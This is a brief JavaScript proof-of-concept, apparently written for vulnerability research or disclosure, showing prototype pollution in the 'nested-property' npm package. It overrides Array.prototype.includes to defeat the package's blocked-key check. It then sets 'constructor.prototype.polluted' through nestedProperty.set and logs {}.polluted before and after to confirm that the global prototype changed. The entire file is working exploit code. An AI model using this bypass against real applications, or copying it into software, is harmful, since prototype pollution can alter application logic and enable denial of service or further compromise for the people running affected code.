Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const nestedProperty = require('nested-property');
const object1 = {};
console.log({}.polluted);
nestedProperty.set(object1, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);